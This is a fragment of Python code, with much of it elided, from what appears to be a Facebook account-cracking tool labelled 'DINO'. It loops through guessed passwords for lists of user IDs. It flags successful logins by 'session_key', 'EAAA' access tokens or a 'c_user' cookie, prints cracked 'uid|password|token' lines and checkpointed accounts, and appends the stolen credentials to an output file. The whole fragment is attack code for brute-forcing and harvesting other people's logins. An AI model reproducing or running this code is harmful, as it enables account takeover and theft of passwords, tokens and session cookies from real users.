	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[DINO-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[DINO-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[DINO-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[DINO-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;95m[DINO-CP] %s|%s\033[0;91m        "%(uid, pw))
		...
		try:
			...
			for pw in asu:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					...
					print("\r\033[0;94m[DINO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))

					ok.append("%s|%s"%(uid, pw))

					open("OK/%s.txt"%(tDINO),"a").write(" + %s|%s\n"%(uid, pw))
